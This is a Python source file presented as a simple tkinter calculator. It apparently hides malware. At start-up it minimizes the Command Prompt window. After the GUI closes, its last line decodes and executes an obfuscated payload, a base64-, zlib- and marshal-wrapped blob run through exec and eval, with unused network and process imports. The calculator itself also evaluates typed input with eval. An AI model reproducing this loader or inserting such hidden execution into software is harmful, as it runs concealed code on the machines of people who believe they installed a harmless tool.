import tkinter as tk
import sys
import zlib
import base64
import marshal
import json
import urllib
import psutil
import win32gui
import win32process
import win32con

# Function to get the cmd window handle
def get_cmd_window_handle():
    return win32gui.FindWindow(None, "Command Prompt")

# Function to minimize a window to tray
def minimize_to_tray(hwnd):
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

# Main function to put cmd window to tray
def put_cmd_window_to_tray():
    hwnd = get_cmd_window_handle()
    if hwnd:
        minimize_to_tray(hwnd)
    else:
        print("Command Prompt window not found.")

# Call the main function to put cmd window to tray
put_cmd_window_to_tray()


def on_button_click(key):
    if key == '=':
        try:
            result = eval(display_var.get())
            display_var.set(result)
        except Exception as e:
            display_var.set("Error")
    elif key == 'C':
        display_var.set("")
    else:
        display_var.set(display_var.get() + key)

# Create the main window
root = tk.Tk()
root.title("Simple Calculator")

# Create a StringVar to hold the display text
display_var = tk.StringVar()
display_var.set("")

# Create the display label
display_label = tk.Label(root, textvariable=display_var, font=("Arial", 20), bd=5, relief=tk.SUNKEN, anchor=tk.E)
display_label.grid(row=0, column=0, columnspan=4, sticky="nsew")

# Define buttons
buttons = [
    ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
    ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
    ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
    ('0', 4, 0), ('.', 4, 1), ('=', 4, 2), ('+', 4, 3),
    ('C', 5, 0)
]

# Create buttons
for (text, row, col) in buttons:
    button = tk.Button(root, text=text, font=("Arial", 16), padx=20, pady=10,
                       command=lambda t=text: on_button_click(t))
    button.grid(row=row, column=col, sticky="nsew")

# Make the grid expandable
for i in range(5):
    root.grid_rowconfigure(i, weight=1)
    root.grid_columnconfigure(i, weight=1)

root.mainloop()

if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwFwUsKgCAQAFBvo27mUxDmukO0lRoqEBMdF92+98ZmjBktv1WKs7dqjYi8TsBLACYCnikGCoxHfqRox67pktYx7Qz1sx6apNP5H/fuFT8=')))))